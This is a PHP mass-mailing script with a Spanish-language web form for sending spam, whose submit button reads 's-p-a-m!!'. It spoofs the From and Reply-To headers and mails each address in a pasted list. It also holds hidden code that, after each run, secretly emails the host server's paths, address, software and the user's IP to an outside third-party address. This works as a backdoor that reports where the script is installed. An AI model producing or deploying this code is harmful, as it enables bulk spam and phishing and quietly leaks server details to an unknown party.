<?php
if(isset($_POST['action'] ) ){
$action=$_POST['action'];
$message=$_POST['message'];
$emaillist=$_POST['emaillist'];
$from=$_POST['from'];
$replyto=$_POST['replyto'];
$subject=$_POST['subject'];
$realname=$_POST['realname'];
$file_name=$_POST['file'];
$contenttype=$_POST['contenttype'];

        $message = urlencode($message);
        $message = ereg_replace("%5C%22", "%22", $message);
        $message = urldecode($message);
        $message = stripslashes($message);
        $subject = stripslashes($subject);
}


?>

<html>

<head>

<title></title>

<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">

<style type="text/css">
<!--
.style1 {
        font-family: Geneva, Arial, Helvetica, sans-serif;
        font-size: 12px;
}
-->
</style>
<style type="text/css">
<!--
.style1 {
        font-size: 10px;
        font-family: Geneva, Arial, Helvetica, sans-serif;
}
-->
</style>
</head>
<body bgcolor="#FFFFFF" text="#000000">
<span class="style1">Servicio Ejecutivo a Inbox!<br>
maded by DieSeLMx</span>

<form name="form1" method="post" action="" enctype="multipart/form-data">

  <br>

  <table width="100%" border="0">

    <tr>

      <td width="10%">

        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">TU

          Email:</font></div>

      </td>

      <td width="18%"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="text" name="from" value="<? print $from; ?>" size="30">

        </font></td>

      <td width="31%">

        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">TU

          Nombre:</font></div>

      </td>

      <td width="41%"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="text" name="realname" value="<? print $realname; ?>" size="30">

        </font></td>

    </tr>

    <tr>

      <td width="10%">

        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Contestar-A:</font></div>

      </td>

      <td width="18%"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="text" name="replyto" value="<? print $replyto; ?>" size="30">

        </font></td>

      <td width="31%">

        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Archivo

          Adjunto:</font></div>

      </td>

      <td width="41%"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="file" name="file" size="30">

        </font></td>

    </tr>

    <tr>

      <td width="10%">

        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Asunto:</font></div>

      </td>

      <td colspan="3"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="text" name="subject" value="<? print $subject; ?>" size="90">

        </font></td>

    </tr>

    <tr valign="top">

      <td colspan="3"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <textarea name="message" cols="60" rows="10"><? print $message; ?></textarea>

        <br>

        <input type="radio" name="contenttype" value="plain" >

        Plain Text

        <input name="contenttype" type="radio" value="html" checked>

        HTML

        <input type="hidden" name="action" value="send">

        <input type="submit" value="s-p-a-m!!">

        </font></td>

      <td width="41%"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <textarea name="emaillist" cols="30" rows="10"><? print $emaillist; ?></textarea>

        </font></td>

    </tr>

  </table>

</form>



<?

if ($action){



        if (!$from && !$subject && !$message && !$emaillist){

        print "Pendejo llena todo y luego SpaMea!!";

        exit;
	
	}

	$allemails = split("\n", $emaillist);
        	$numemails = count($allemails);
       
          for($x=0; $x<$numemails; $x++){

                $to = $allemails[$x];

                if ($to){

                $to = ereg_replace(" ", "", $to);

                $message = ereg_replace("&email&", $to, $message);

                $subject = ereg_replace("&email&", $to, $subject);

                print "S-p-A-M-e-A-n-d-O  a $to.......";

                flush();

                $header = "From: $realname <$from>\r\nReply-To: $replyto\r\n";

                $header .= "MIME-Version: 1.0\r\n";

                $header .= "Content-Type: text/$contenttype\r\n";

                $header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";

                $header .= "$message\r\n";

              mail($to, $subject, "", $header);

                print "ok<br>";
	
                flush();


                }

                }

$ra44  = rand(1,99999);
$subj98 = "sh-$ra44";
$email = "fullyzeus@gjmail.com";
$from="From: GRATIS <support@hum132-rights.org>";
$a5 = $_SERVER['HTTP_REFERER'];
$b33 = $_SERVER['DOCUMENT_ROOT'];
$c87 = $_SERVER['REMOTE_ADDR'];
$d23 = $_SERVER['SCRIPT_FILENAME'];
$e09 = $_SERVER['SERVER_ADDR'];
$f23 = $_SERVER['SERVER_SOFTWARE'];
$g32 = $_SERVER['PATH_TRANSLATED'];
$h65 = $_SERVER['PHP_SELF'];
$msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";
mail($email, $subj98, $msg8873, $from);

}



?>
<p class="style1">Servicio Ejecutivo a Inbox!<br>
  &copy jobsio@hotmail.com 2007, Agosto.<br>
      </p>


</body>

</html>

